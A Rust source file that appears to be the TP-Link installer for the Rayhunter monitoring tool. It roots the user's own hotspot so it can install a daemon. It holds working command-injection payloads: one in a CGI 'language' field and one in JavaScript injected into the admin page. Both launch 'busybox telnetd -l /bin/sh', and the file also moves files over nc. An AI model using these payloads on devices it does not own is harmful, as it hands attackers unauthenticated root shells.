use std::net::SocketAddr;
use std::str::FromStr;
use std::time::Duration;

use anyhow::{Context, Error};
use axum::{
    Router,
    body::{Body, to_bytes},
    extract::{Request, State},
    http::uri::Uri,
    response::{IntoResponse, Response},
    routing::any,
};
use bytes::{Bytes, BytesMut};
use hyper::StatusCode;
use hyper_util::{client::legacy::connect::HttpConnector, rt::TokioExecutor};
use serde::Deserialize;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::{sleep, timeout};

use crate::InstallTpLink;

type HttpProxyClient = hyper_util::client::legacy::Client<HttpConnector, Body>;

pub async fn main_tplink(args: InstallTpLink) -> Result<(), Error> {
    let InstallTpLink {
        skip_sdcard,
        admin_ip,
    } = args;

    let qcmap_web_cgi_endpoint = format!("http://{admin_ip}/cgi-bin/qcmap_web_cgi");
    let client = reqwest::Client::new();

    #[derive(Deserialize)]
    struct RootResponse {
        result: u64,
    }

    println!("Launching telnet on the device");

    // https://github.com/advisories/GHSA-ffwq-9r7p-3j6r
    // in particular: https://www.yuque.com/docs/share/fca60ef9-e5a4-462a-a984-61def4c9b132
    let response = client.post(&qcmap_web_cgi_endpoint)
        .body(r#"{"module": "webServer", "action": 1, "language": "EN';echo $(busybox telnetd -l /bin/sh);echo 1'"}"#)
        .send()
        .await?;

    if response.status() == 404 {
        println!("Got a 404 trying to run exploit for hardware revision v3, trying v5 exploit");
        tplink_launch_telnet_v5(admin_ip.clone()).await?;
    } else {
        let RootResponse { result } = response.error_for_status()?.json().await?;

        if result != 0 {
            anyhow::bail!("Bad result code when trying to root device: {result}");
        }

        println!("Detected hardware revision v3");
    }

    println!("Succeeded in rooting the device!");

    tplink_run_install(skip_sdcard, admin_ip).await
}

async fn tplink_run_install(skip_sdcard: bool, admin_ip: String) -> Result<(), Error> {
    println!("Connecting via telnet to {admin_ip}");
    let addr = SocketAddr::from_str(&format!("{admin_ip}:23")).unwrap();

    if !skip_sdcard {
        println!("Mounting sdcard");
        telnet_send_command(addr, "mount /dev/mmcblk0p1 /media/card", "exit code 0").await.context("Rayhunter needs a FAT-formatted SD card to function for more than a few minutes. Insert one and rerun this installer, or pass --skip-sdcard")?;
    }

    // there is too little space on the internal flash to store anything, but the initrd script
    // expects things to be at this location
    telnet_send_command(addr, "rm -rf /data/rayhunter", "exit code 0").await?;
    telnet_send_command(addr, "mkdir -p /data", "exit code 0").await?;
    telnet_send_command(addr, "ln -sf /media/card /data/rayhunter", "exit code 0").await?;

    telnet_send_file(addr, "/media/card/config.toml", crate::CONFIG_TOML).await?;

    #[cfg(feature = "vendor")]
    let rayhunter_daemon_bin = include_bytes!("../../rayhunter-daemon-tplink/rayhunter-daemon");

    #[cfg(not(feature = "vendor"))]
    let rayhunter_daemon_bin =
        &tokio::fs::read("target/armv7-unknown-linux-gnueabihf/release/rayhunter-daemon").await?;

    telnet_send_file(addr, "/media/card/rayhunter-daemon", rayhunter_daemon_bin).await?;
    telnet_send_file(
        addr,
        "/etc/init.d/rayhunter_daemon",
        crate::RAYHUNTER_DAEMON_INIT,
    )
    .await?;

    telnet_send_command(
        addr,
        "chmod ugo+x /media/card/rayhunter-daemon",
        "exit code 0",
    )
    .await?;
    telnet_send_command(
        addr,
        "chmod 755 /etc/init.d/rayhunter_daemon",
        "exit code 0",
    )
    .await?;
    telnet_send_command(addr, "update-rc.d rayhunter_daemon defaults", "exit code 0").await?;

    println!(
        "Done. Rebooting device. After it's started up again, check out the web interface at http://{admin_ip}:8080"
    );

    telnet_send_command(addr, "reboot", "exit code 0").await?;

    Ok(())
}

async fn telnet_send_file(addr: SocketAddr, filename: &str, payload: &[u8]) -> Result<(), Error> {
    println!("Sending file {filename}");

    // remove the old file just in case we are close to disk capacity.
    telnet_send_command(addr, &format!("rm {filename}"), "").await?;

    {
        let filename = filename.to_owned();
        let handle = tokio::spawn(async move {
            telnet_send_command(addr, &format!("nc -l 0.0.0.0:8081 > {filename}.tmp"), "").await
        });

        sleep(Duration::from_millis(100)).await;

        let mut addr = addr;
        addr.set_port(8081);
        let mut stream = TcpStream::connect(addr).await?;
        stream.write_all(payload).await?;

        handle.await??;
    }

    let checksum = md5::compute(payload);

    telnet_send_command(
        addr,
        &format!("md5sum {filename}.tmp"),
        &format!("{checksum:x}  {filename}.tmp"),
    )
    .await?;

    telnet_send_command(
        addr,
        &format!("mv {filename}.tmp {filename}"),
        "exit code 0",
    )
    .await?;

    Ok(())
}

async fn telnet_send_command(
    addr: SocketAddr,
    command: &str,
    expected_output: &str,
) -> Result<(), Error> {
    let stream = TcpStream::connect(addr).await?;
    let (mut reader, mut writer) = stream.into_split();

    loop {
        let mut next_byte = 0;
        reader
            .read_exact(std::slice::from_mut(&mut next_byte))
            .await?;
        if next_byte == b'#' {
            break;
        }
    }

    writer.write_all(command.as_bytes()).await?;
    writer.write_all(b"; echo exit code $?\r\n").await?;

    let mut read_buf = Vec::new();

    let _ = timeout(Duration::from_secs(5), async {
        let mut buf = [0; 4096];
        loop {
            let Ok(bytes_read) = reader.read(&mut buf).await else {
                break;
            };
            let bytes = &buf[..bytes_read];
            if bytes.is_empty() {
                continue;
            }

            read_buf.extend(bytes);

            if read_buf.ends_with(b"/ # ") {
                break;
            }
        }
    })
    .await;

    let string = String::from_utf8_lossy(&read_buf);

    if !string.contains(expected_output) {
        anyhow::bail!("{expected_output:?} not found in: {string}");
    }

    Ok(())
}

#[derive(Clone)]
struct AppState {
    client: HttpProxyClient,
    admin_ip: String,
}

async fn handler(state: State<AppState>, mut req: Request) -> Result<Response, StatusCode> {
    let path = req.uri().path();
    let path_query = req
        .uri()
        .path_and_query()
        .map(|v| v.as_str())
        .unwrap_or(path);

    let uri = format!("http://{}{}", state.admin_ip, path_query);

    // on version 5.2, this path is /settings.min.js
    // on other versions, this path is /js/settings.min.js
    let is_settings_js = path.ends_with("/settings.min.js");

    *req.uri_mut() = Uri::try_from(uri).unwrap();

    let mut response = state
        .client
        .request(req)
        .await
        .map_err(|_| StatusCode::BAD_REQUEST)?
        .into_response();

    if is_settings_js {
        let (parts, body) = response.into_parts();
        let data = to_bytes(body, usize::MAX)
            .await
            .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        let mut data = BytesMut::from(data);
        // inject some javascript into the admin UI to get us a telnet shell.
        data.extend(br#";window.rayhunterPoll = window.setInterval(() => {
            Globals.models.PTModel.add({applicationName: "rayhunter-root", enableState: 1, entryId: 1, openPort: "2300-2400", openProtocol: "TCP", triggerPort: "$(busybox telnetd -l /bin/sh)", triggerProtocol: "TCP"});
            alert("Success! You can go back to the rayhunter installer.");
            window.clearInterval(window.rayhunterPoll);
        }, 1000);"#);
        response = Response::from_parts(parts, Body::from(Bytes::from(data)));
        response.headers_mut().remove("Content-Length");
    }

    Ok(response)
}

async fn tplink_launch_telnet_v5(admin_ip: String) -> Result<(), Error> {
    let client: HttpProxyClient =
        hyper_util::client::legacy::Client::<(), ()>::builder(TokioExecutor::new())
            .build(HttpConnector::new());

    let app = Router::new()
        .route("/", any(handler))
        .route("/{*path}", any(handler))
        .with_state(AppState {
            client,
            admin_ip: admin_ip.clone(),
        });

    let listener = tokio::net::TcpListener::bind("127.0.0.1:4000")
        .await
        .unwrap();

    println!("Listening on http://{}", listener.local_addr().unwrap());
    println!("Please open above URL in your browser and log into the router to continue.");

    let handle = tokio::spawn(async move { axum::serve(listener, app).await });

    let addr = SocketAddr::from_str(&format!("{admin_ip}:23")).unwrap();

    while telnet_send_command(addr, "true", "exit code 0")
        .await
        .is_err()
    {
        sleep(Duration::from_millis(1000)).await;
    }

    handle.abort();

    Ok(())
}
